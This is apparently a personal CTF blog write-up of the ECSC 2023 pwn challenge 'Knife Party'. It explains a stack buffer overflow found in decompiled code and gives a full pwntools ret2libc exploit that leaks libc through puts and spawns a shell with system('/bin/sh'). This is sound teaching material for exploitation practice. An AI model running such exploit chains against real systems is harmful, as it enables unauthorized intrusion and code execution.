---
id: 15
title: "ECSC 2023: Knife Party"
subtitle: "ECSC 2023 Day 1: Pwn"
date: "2023.11.02"
tags: "ecsc, ecsc2023, c++, pwn, ctf, ctf blog, writeup"
---

## Foreword

I participated in ECSC 2023 as a guest team as part of Team Singapore with NUS Greyhats. The competition was quite chaotic due to many factors but in the end it was still a fun competitions thanks to all the interesting compeititors. This was a live on-site competition in Hamar, Norway so I was lucky enough to get a free holiday in the middle of my school term as well :)

I mainly did the pwn challenges relating to the stack because I'm not very good at heap pwn, so I left it up to my teammate.

This challenge is a pretty straight forward ret2libc challenge if you read through the decompiled code. It hides its vulnerabilities in a few different functions.

# Knife Party

We run `checksec` on the binary:
```bash
[*] '/mnt/e/ctf_archive/ecsc2023/d1/knifeparty/knife_party'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

It has Full RELRO and NX enabled, but no canary or PIE.

First we open the binary in IDA and we see that it calls 3 functions, `setup()`, `banner()` and `forge()`. A quick sift through shows us that `forge()` is the function that handles the menu. Decompiling `forge()` yields the following:

```c++
__int64 forge()
{
  __int64 num; // rax

  printf("Choose class of knife!\n\n1. Sword\n2. Bat\n3. Knife\n\n>> ");
  num = read_num();
  if ( num == 2 )
    return forge_bat();
  if ( num == 3 )
    forge_knife();
  if ( num != 1 )
  {
    error("No such class! Come back when you are ready!\n");
    exit(22);
  }
  return forge_sword();
}
```

Testing the binary against inputs hints us that `forge_knife()` does nothing of value, `forge_bat()` and `forge_sword()` are the functions we are interested in. Opening them up in IDA, we can see that both of the functions have a buffer overflow vulnerability. We focus on `forge_sword()`:
```c++
int forge_sword()
{
  __int64 buf[4]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 num; // [rsp+20h] [rbp-10h]
  unsigned __int64 i; // [rsp+28h] [rbp-8h]

  memset(buf, 0, sizeof(buf));
  printf("\nThe Sword class is pretty accurate and fast when carving a pumpkin!\n\nChoose length of sword (1-5): ");
  num = read_num();
  if ( num - 1 > 4 )
    return error("Invalid length! Come back when you are ready!\n");
  puts(asc_40104F);
  for ( i = 0LL; i <= num; ++i )
    puts(&byte_401056);
  puts(asc_401060);
  printf(
    "\n%s[+] Here is your sword! Do you want to give it a name for the contest?\n\n>> %s",
    "\x1B[1;32m",
    "\x1B[1;34m");
  read(0, buf, 0x120uLL);
  return puts("\nBest of luck!!");
}
```

`buf` is initialized with size `0x30` but at the end before `return`, `read(0, buf, 0x120uLL)` allows a `0x120uLL` size read into the buffer. This means we can attempt a ret2libc attack.

The offset for the bof would be `0x30` (buffer size) + `0x8` (`$rbp`) which gives us `0x38`. We pad `0x38` and do a ret2libc attack, building a ROP chain to leak the lilbc addresses. We then redo the same thing but with the leaked libc offset to find `system` and `/bin/sh`. Build and execute the next ROP chain to pop shell.

pwntools automates the process for us.
```py
from pwn import *
from exploit import *

# set exploit source, context binary, context log_level, libc
elf = context.binary = ELF("./knife_party", checksec=False)
# context.log_level = 'debug'
libc = ELF("./glibc/libc.so.6")

# Run binary 1st time
p = exploit_source("./knife_party", "localhost")

rop = ROP(elf)

p.sendlineafter(b'>> ', "1")
p.recvuntil(": ")
p.sendline("5")
p.recvuntil(">> ")

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

payload = flat([{0x38: p64(pop_rdi)},
                elf.got['puts'],
                elf.symbols['puts'],
                elf.symbols['main']])

# leak libc address and calculate libc base
p.sendline(payload)
p.recvuntil(b'Best of luck!!\n')

libc.address = u64(p.recvline().strip().ljust(8,b'\x00')) - libc.symbols['puts']
success(f"{hex(libc.address) =}")

# ret2libc
p.sendlineafter(b'>> ', "1")
p.recvuntil(": ")
p.sendline("5")
p.recvuntil(">> ")

rop2 = ROP(libc)

libc_ret = rop2.find_gadget(['ret'])[0]
rop2.raw(libc_ret)
rop2.system(next(libc.search(b'/bin/sh')))

payload2 = flat({0x38: rop2.chain()})

p.sendline(payload2)

p.interactive()
```

Run the code on remote, pop shell, then simply `cat flag.txt` for the flag.